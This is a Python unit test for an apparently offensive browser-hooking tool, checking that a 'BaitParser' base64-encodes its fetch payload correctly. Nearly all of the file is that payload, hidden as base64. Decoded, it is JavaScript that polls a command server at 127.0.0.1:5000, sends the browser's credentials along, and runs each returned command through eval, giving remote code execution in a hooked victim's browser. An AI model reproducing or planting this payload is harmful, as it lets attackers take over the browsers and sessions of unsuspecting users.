import unittest
from parsers import BaitParser, Bait

URL_ENCODED_FETCH_BAIT = (b"LyoKRGVmYXVsdCBwYXlsb2FkIGZvciBob29raW5nIGJyb3dzZXJzIHRvIHRoZSBmaXNoZXJtYW4ncyBib2F0IHVzaW5nIGZldGNoIGFwaQpUaGlzIHBheWxvYWQgaWYgZm9yIG5vbi1wZXJzaXN0ZW50IHNjcmlwdHMgdGhhdCBhZnRlciBldmFsJ2QgY2FuIGJlIHRocm93biBhd2F5CiovCgoKKGFzeW5jIGZ1bmN0aW9uKCkgewogICAgdmFyIHNlcnZlckFkZHJlc3MgPSAiMTI3LjAuMC4xOjUwMDAiOwogICAgdmFyIGNvbm5lY3Rpb25SZXRyeUNvdW50ID0gMDsKCiAgICBhc3luYyBmdW5jdGlvbiBzbGVlcCh0aW1lKSB7CiAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlKChyZXNvbHZlKSA9PiBzZXRUaW1lb3V0KHJlc29sdmUsIHRpbWUpKTsKICAgIH0KCiAgICBhc3luYyBmdW5jdGlvbiBzdGFydFNlc3Npb24oc2VydmVyQWRkcmVzcykgewogICAgICAgIGZvciAobGV0IG5Db25uZWN0aW9uQXR0ZW1wcyA9IDA7IG5Db25uZWN0aW9uQXR0ZW1wcyA8IDQ7IG5Db25uZWN0aW9uQXR0ZW1wcysrKSB7CiAgICAgICAgICAgIGNvbnNvbGUubG9nKCJIb29raW5nIHRvIHNlcnZlci4uLiAiKTsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGNvbnN0IHJlcyA9IGF3YWl0IGZldGNoKGBodHRwOi8vJHtzZXJ2ZXJBZGRyZXNzfS9ob29rL2AsIHsKICAgICAgICAgICAgICAgICAgICBtZXRob2Q6ICJHRVQiLAogICAgICAgICAgICAgICAgICAgIG1vZGU6ICdjb3JzJywKICAgICAgICAgICAgICAgICAgICBoZWFkZXJzOiB7CiAgICAgICAgICAgICAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgIGNyZWRlbnRpYWxzOiAiaW5jbHVkZSIKICAgICAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgICAgIGlmICghcmVzLm9rKSB7CiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKGBIVFRQIGVycm9yISBzdGF0dXM6ICR7cmVzLnN0YXR1c31gKTsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsKICAgIAogICAgICAgICAgICB9IAogICAgICAgICAgICBjYXRjaCAoZXJyb3IpIHsKICAgICAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoYEVycm9yIGhvb2tpbmcgdG8gc2VydmVyOiAke2Vycm9yfSwgbnVtYmVyIG9mIGNvbm5lY3Rpb24gYXR0ZW1wdHM6ICR7bkNvbm5lY3Rpb25BdHRlbXBzfS4uLiBgKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgYXdhaXQgc2xlZXAoMjAwMCk7CiAgICAgICAgfQogICAgICAgIAogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICBhc3luYyBmdW5jdGlvbiBzZW5kUmVxdWVzdChzZXJ2ZXJBZGRyZXNzKSB7CiAgICAgICAgY29uc29sZS5sb2coIkZldGNoaW5nIGNvbW1hbmQgZnJvbSBzZXJ2ZXIuLi4iKTsKICAgICAgICB0cnkgewogICAgICAgICAgICBjb25zdCByZXMgPSBhd2FpdCBmZXRjaChgaHR0cDovLyR7c2VydmVyQWRkcmVzc30vY29tbWFuZC9gLCB7CiAgICAgICAgICAgICAgICBtZXRob2Q6ICJHRVQiLAogICAgICAgICAgICAgICAgbW9kZTogJ2NvcnMnLCAKICAgICAgICAgICAgICAgIGhlYWRlcnM6IHsKICAgICAgICAgICAgICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgY3JlZGVudGlhbHM6ICJpbmNsdWRlIgogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIGlmICghcmVzLm9rKSB7CiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoYEhUVFAgZXJyb3IhIHN0YXR1czogJHtyZXMuc3RhdHVzfWApOwogICAgICAgICAgICB9CgogICAgICAgICAgICBsZXQgZGF0YSA9IGF3YWl0IHJlcy5qc29uKCk7CiAgICAgICAgICAgIGlmICghZGF0YS5jb21tYW5kKSB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmxvZygiTm8gY29tbWFuZCB0byBleGVjdXRlLi4uICIpOwogICAgICAgICAgICB9CgogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgIGV2YWwoYXRvYihkYXRhLmNvbW1hbmQpKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgcmV0dXJuIHRydWU7CgogICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgICAgIGNvbm5lY3Rpb25SZXRyeUNvdW50Kys7CiAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoYEVycm9yIGZldGNoaW5nIGNvbW1hbmQgZnJvbSBzZXJ2ZXI6ICR7ZXJyb3J9LCBudW1iZXIgb2YgY29ubmVjdGlvbiBhdHRlbXB0czogJHtjb25uZWN0aW9uUmV0cnlDb3VudH0uLi4gYCk7CiAgICAgICAgICAgIGlmIChjb25uZWN0aW9uUmV0cnlDb3VudCA+IDMpIHsKICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgfQogICAgfQoKICAgIGNvbnN0IHNlc3Npb25TdGFydFN0YXR1cyA9IGF3YWl0IHN0YXJ0U2Vzc2lvbihzZXJ2ZXJBZGRyZXNzKTsKCiAgICBpZiAoIXNlc3Npb25TdGFydFN0YXR1cykgewogICAgICAgIHRocm93IG5ldyBFcnJvcigiU3RvcHBpbmcgZXhlY3V0aW9uIGR1ZSB0byBjb25uZWN0aW9uIHByb2JsZW1zLi4uICIpOyAvLyBUT0RPOiBUaGluayBpZiB0byBjbGVhbiB1cCBzY3JpcHQgZnJvbSBwYWdlCiAgICB9CgogICAgY29uc3QgaW50ZXJ2YWxJZCA9IHNldEludGVydmFsKCgpID0+IHsgCiAgICAgICAgY29uc3Qgc3RhdHVzID0gc2VuZFJlcXVlc3Qoc2VydmVyQWRkcmVzcyk7CiAgICAgICAgaWYgKCFzdGF0dXMpIHsKICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChpbnRlcnZhbElkKTsKICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKCJTdG9wcGluZyBleGVjdXRpb24gZHVlIHRvIGNvbm5lY3Rpb24gcHJvYmxlbXMuLi4gIik7IC8vIFRPRE86IFRoaW5rIGlmIHRvIGNsZWFuIHVwIHNjcmlwdCBmcm9tIHBhZ2UKICAgICAgICB9CgogICAgfSwgMjAwMCk7Cn0pKCk7")

class TestBaitParser(unittest.TestCase):
    def test_bait_parser(self):
        bait_parser = BaitParser(Bait.FETCH)
        encoded_bait = bait_parser.b64_encode()

        self.assertEqual(URL_ENCODED_FETCH_BAIT, encoded_bait)


if __name__ == '__main__':
    unittest.main()
